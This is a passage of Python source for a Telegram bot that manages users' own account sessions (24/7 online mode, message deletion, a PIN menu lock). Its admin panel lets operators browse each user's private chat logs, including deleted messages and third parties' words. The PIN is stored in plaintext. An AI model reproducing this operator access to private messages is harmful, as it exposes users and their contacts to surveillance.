    await update_db_config(user_id, {"status_24_7": new_st})
    
    data = get_user_state(user_id)
    data["status_24_7"] = new_st
    if new_st and not data.get("task_24_7"):
        data["task_24_7"] = asyncio.create_task(keep_online_loop(user_id))
    elif not new_st and data.get("task_24_7"):
        data["task_24_7"].cancel()
        data["task_24_7"] = None
        
    status_txt = LANG["status_on"] if new_st else LANG["status_off"]
    text = LANG["msg_247_text"].format(status_txt)
    builder = InlineKeyboardBuilder()
    builder.button(text=LANG["btn_turn_off"] if new_st else LANG["btn_turn_on"], callback_data="toggle_247")
    builder.button(text=LANG["btn_back_menu"], callback_data="main_menu")
    builder.adjust(1)
    await edit_or_send(user_id, text, reply_markup=builder.as_markup())

@dp.callback_query(F.data == "menu_delete")
async def menu_delete(cb: types.CallbackQuery):
    builder = InlineKeyboardBuilder()
    builder.button(text="5 ✉️", callback_data="del_5")
    builder.button(text="10 ✉️", callback_data="del_10")
    builder.button(text="50 ✉️", callback_data="del_50")
    builder.button(text="100 ✉️", callback_data="del_100")
    builder.button(text=LANG["btn_back_menu"], callback_data="main_menu")
    builder.adjust(2, 2, 1)
    await edit_or_send(cb.from_user.id, LANG["msg_del_text"], reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("del_"))
async def process_del(cb: types.CallbackQuery):
    count = int(cb.data.split("_")[1])
    user_id = cb.from_user.id
    data = get_user_state(user_id)
    
    if data["client"] and data["client"].is_connected:
        try:
            ids = []
            async for m in data["client"].get_chat_history(user_id, limit=count):
                ids.append(m.id)
            if ids:
                await data["client"].delete_messages(user_id, ids)
        except Exception: pass
        
    builder = InlineKeyboardBuilder().button(text=LANG["btn_back_menu"], callback_data="main_menu")
    await edit_or_send(user_id, f"✅ Команда на удаление {count} сообщений отправлена!", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "menu_block_settings")
async def menu_block_settings(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    cfg = await get_db_config(user_id)
    has_pin = bool(cfg.get("menu_lock_code"))
    
    text = f"🔒 **Блокировка меню (PIN)**\n\nТекущий статус: {LANG['status_on'] if has_pin else LANG['status_off']}"
    builder = InlineKeyboardBuilder()
    if has_pin:
        builder.button(text=LANG["btn_lock_now"], callback_data="lock_now")
        builder.button(text="Снять блокировку 🔓", callback_data="disable_block")
    else:
        builder.button(text="Установить PIN-код 🔐", callback_data="setup_block_pin")
    builder.button(text=LANG["btn_back_menu"], callback_data="main_menu")
    builder.adjust(1)
    await edit_or_send(user_id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "lock_now")
async def lock_now(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    cfg = await get_db_config(user_id)
    if cfg.get("menu_lock_code"):
        get_user_state(user_id)["state"] = "WAITING_UNLOCK_CODE"
        await edit_or_send(user_id, LANG["msg_unlock_req"])
    else:
        await cb.answer("❌ PIN-код не установлен!", show_alert=True)

@dp.callback_query(F.data == "setup_block_pin")
async def setup_block_pin(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    get_user_state(user_id)["state"] = "WAITING_SET_PIN"
    builder = InlineKeyboardBuilder().button(text=LANG["btn_back"], callback_data="menu_block_settings")
    await edit_or_send(user_id, LANG["msg_block_setup"], reply_markup=builder.as_markup())

@dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_SET_PIN")
async def process_set_pin(message: types.Message):
    user_id = message.from_user.id
    pin = message.text.strip()
    
    if len(pin) == 4 and pin.isdigit():
        await update_db_config(user_id, {"is_menu_locked": True, "menu_lock_code": pin})
        get_user_state(user_id)["state"] = "MENU"
        builder = InlineKeyboardBuilder().button(text=LANG["btn_confirm"], callback_data="menu_block_settings")
        await edit_or_send(user_id, "✅ PIN-код успешно сохранен и меню заблокировано!", reply_markup=builder.as_markup())
    else:
        msg_err = await message.answer("❌ PIN-код должен состоять ровно из 4 цифр!")
        asyncio.create_task(delayed_delete(msg_err, 3))

@dp.callback_query(F.data == "disable_block")
async def disable_block(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    await update_db_config(user_id, {"is_menu_locked": False, "menu_lock_code": None})
    get_user_state(user_id)["state"] = "MENU"
    await menu_block_settings(cb)

@dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_UNLOCK_CODE")
async def process_unlock_pin(message: types.Message):
    user_id = message.from_user.id
    pin = message.text.strip()
    
    cfg = await get_db_config(user_id)
    if pin == cfg.get("menu_lock_code"):
        get_user_state(user_id)["state"] = "MENU"
        await update_db_config(user_id, {"last_interaction_time": time.time()})
        await show_main_menu(user_id, message.from_user.username)
    else:
        await edit_or_send(user_id, LANG["msg_unlock_req"])
        msg_err = await message.answer("❌ Неверный PIN-код!")
        asyncio.create_task(delayed_delete(msg_err, 3))

@dp.callback_query(F.data == "admin_menu")
async def admin_menu(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    if not is_admin(user_id, cb.from_user.username): return
    
    builder = InlineKeyboardBuilder()
    builder.button(text="👥 Список юзеров", callback_data="admin_users")
    builder.button(text="📊 Аналитика бота", callback_data="admin_stats")
    builder.button(text="🔍 Найти юзера", callback_data="admin_find_user")
    builder.button(text="🚀 Выдать админку", callback_data="admin_grant")
    builder.button(text=LANG["btn_back_menu"], callback_data="main_menu")
    builder.adjust(2, 2, 1)
    await edit_or_send(user_id, "👑 **Админ Панель**", reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(cb: types.CallbackQuery):
    if not is_admin(cb.from_user.id, cb.from_user.username): return
    
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent
    
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    res = supabase.table("daily_stats").select("*").eq("date", today).execute()
    inc = res.data[0]["incoming"] if res.data else 0
    act = res.data[0]["active"] if res.data else 0
    
    users_res = supabase.table("user_configs").select("user_id").execute()
    total_users = len(users_res.data) if users_res.data else 0
    
    text = (
        f"📊 **Аналитика системы**\n\n"
        f"💻 Загрузка CPU: {cpu}%\n"
        f"🧠 Загрузка RAM: {ram}%\n\n"
        f"📅 Статистика за сегодня ({today}):\n"
        f"📥 Новых входов (/start): {inc}\n"
        f"⚡️ Активных сессий: {act}\n"
        f"👥 Всего пользователей в БД: {total_users}"
    )
    builder = InlineKeyboardBuilder()
    builder.button(text=LANG["btn_refresh"], callback_data="admin_stats")
    builder.button(text=LANG["btn_back"], callback_data="admin_menu")
    builder.adjust(1)
    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "admin_users")
async def admin_users(cb: types.CallbackQuery):
    if not is_admin(cb.from_user.id, cb.from_user.username): return
    
    res = supabase.table("user_configs").select("user_id, username, first_name").execute()
    users = res.data or []
    
    builder = InlineKeyboardBuilder()
    for u in users[:20]:
        uid = u["user_id"]
        fn = u.get("first_name") or "User"
        builder.button(text=f"👤 {fn} ({uid})", callback_data=f"admin_view_u_{uid}")
    builder.button(text=LANG["btn_back"], callback_data="admin_menu")
    builder.adjust(1)
    await edit_or_send(cb.from_user.id, "👥 **Список зарегистрированных юзеров:**", reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("admin_view_u_"))
async def admin_view_user(cb: types.CallbackQuery):
    if not is_admin(cb.from_user.id, cb.from_user.username): return
    target_id = int(cb.data.split("_")[3])
    
    cfg = await get_db_config(target_id)
    sess = await get_db_session(target_id)
    
    text = (
        f"👤 **Карточка пользователя:** {target_id}\n\n"
        f"Имя: {cfg.get('first_name')}\n"
        f"Юзернейм: @{cfg.get('username')}\n"
        f"Сессия активна: {'Да ✅' if sess else 'Нет ❌'}\n"
        f"Часовой пояс: {cfg.get('timezone_name')}\n"
        f"Режим 24/7: {'Да' if cfg.get('status_24_7') else 'Нет'}"
    )
    builder = InlineKeyboardBuilder()
    if sess:
        builder.button(text="💬 Просмотр ЛС (Логи)", callback_data=f"admin_chats_{target_id}")
    builder.button(text=LANG["btn_back"], callback_data="admin_users")
    builder.adjust(1)
    await edit_or_send(cb.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("admin_chats_"))
async def admin_user_chats(cb: types.CallbackQuery):
    if not is_admin(cb.from_user.id, cb.from_user.username): return
    target_id = int(cb.data.split("_")[2])
    
    res = supabase.table("messages_log").select("chat_id, sender_name").eq("user_id", target_id).execute()
    chats_map = {}
    if res.data:
        for r in res.data:
            chats_map[r["chat_id"]] = r["sender_name"]
            
    builder = InlineKeyboardBuilder()
    for cid, sname in list(chats_map.items())[:15]:
        builder.button(text=f"💬 {sname} ({cid})", callback_data=f"admin_openchat_{target_id}_{cid}_1")
    builder.button(text=LANG["btn_back"], callback_data=f"admin_view_u_{target_id}")
    builder.adjust(1)
    await edit_or_send(cb.from_user.id, f"💬 **Чаты пользователя {target_id}:**", reply_markup=builder.as_markup(), parse_mode="Markdown")

async def refresh_admin_pm_view(admin_id, target_id, chat_id, page=1):
    limit = 10
    offset = (page - 1) * limit
    
    res = supabase.table("messages_log").select("*").eq("user_id", target_id).eq("chat_id", chat_id).order("id", desc=True).range(offset, offset + limit - 1).execute()
    msgs = res.data or []
    msgs.reverse()
    
    text = f"📖 **Лог чата {chat_id} (Стр. {page})**\n\n"
    if not msgs: text += "Нет доступных сообщений."
    else:
        for m in msgs:
            del_mark = "🗑 [УДАЛЕНО] " if m.get("is_deleted") else ""
            m_type = f" {m['media_type']}" if m.get("is_media") else ""
            text += f"{del_mark}**{m['sender_name']}**: {m['text']}{m_type}\n"
            
    get_user_state(admin_id)["current_menu"] = "admin_viewpm"
    get_user_state(admin_id)["admin_view_user"] = target_id
    get_user_state(admin_id)["admin_view_chat"] = chat_id
    get_user_state(admin_id)["admin_view_page"] = page
    
    builder = InlineKeyboardBuilder()
    navs = []
    if page > 1: navs.append(InlineKeyboardBuilder().button(text="⬅️ Назад", callback_data=f"admin_openchat_{target_id}_{chat_id}_{page-1}").buttons[0])
    navs.append(InlineKeyboardBuilder().button(text="🔄 Обновить", callback_data=f"admin_openchat_{target_id}_{chat_id}_{page}").buttons[0])
    navs.append(InlineKeyboardBuilder().button(text="Вперед ➡️", callback_data=f"admin_openchat_{target_id}_{chat_id}_{page+1}").buttons[0])
    builder.row(*navs)
    builder.button(text=LANG["btn_back"], callback_data=f"admin_chats_{target_id}")
    
    await edit_or_send(admin_id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("admin_openchat_"))
async def admin_openchat(cb: types.CallbackQuery):
    if not is_admin(cb.from_user.id, cb.from_user.username): return
    parts = cb.data.split("_")
    target_id = int(parts[2])
    chat_id = int(parts[3])
    page = int(parts[4])
    await refresh_admin_pm_view(cb.from_user.id, target_id, chat_id, page)

@dp.callback_query(F.data == "admin_find_user")
async def admin_find_user(cb: types.CallbackQuery):
    if not is_admin(cb.from_user.id, cb.from_user.username): return
    get_user_state(cb.from_user.id)["state"] = "WAITING_SEARCH_USER"
    builder = InlineKeyboardBuilder().button(text=LANG["btn_back"], callback_data="admin_menu")
    await edit_or_send(cb.from_user.id, "Введите Telegram ID юзера для поиска:", reply_markup=builder.as_markup())

@dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_SEARCH_USER")
async def process_find_user(message: types.Message):
    admin_id = message.from_user.id
    if not is_admin(admin_id, message.from_user.username): return
    
    try:
        target_id = int(message.text.strip())
        get_user_state(admin_id)["state"] = "MENU"
        cb_dummy = types.CallbackQuery(id="", from_user=message.from_user, chat_instance="", message=message, data=f"admin_view_u_{target_id}")
        await admin_view_user(cb_dummy)
    except ValueError:
        msg_err = await message.answer("❌ ID должен быть числом!")
        asyncio.create_task(delayed_delete(msg_err, 3))

@dp.callback_query(F.data == "admin_grant")
async def admin_grant(cb: types.CallbackQuery):
    if not is_admin(cb.from_user.id, cb.from_user.username): return
    get_user_state(cb.from_user.id)["state"] = "WAITING_GRANT_ADMIN"
    builder = InlineKeyboardBuilder().button(text=LANG["btn_back"], callback_data="admin_menu")
    await edit_or_send(cb.from_user.id, "Введите Telegram ID юзера, которому хотите выдать временную админку:", reply_markup=builder.as_markup())

@dp.message(lambda msg: get_user_state(msg.from_user.id)["state"] == "WAITING_GRANT_ADMIN")
async def process_grant_admin(message: types.Message):
    admin_id = message.from_user.id
    if not is_admin(admin_id, message.from_user.username): return
    
    try:
        target_id = int(message.text.strip())
        TEMP_ADMINS.add(target_id)
        get_user_state(admin_id)["state"] = "MENU"
        builder = InlineKeyboardBuilder().button(text=LANG["btn_confirm"], callback_data="admin_menu")
        await edit_or_send(admin_id, f"✅ Юзеру {target_id} временно выданы права администратора!", reply_markup=builder.as_markup())
    except ValueError:
        msg_err = await message.answer("❌ ID должен быть числом!")
        asyncio.create_task(delayed_delete(msg_err, 3))

async def handle_ping(request):
    return web.Response(text="OK")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def main():
    asyncio.create_task(start_web_server())
    asyncio.create_task(background_lock_monitor())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
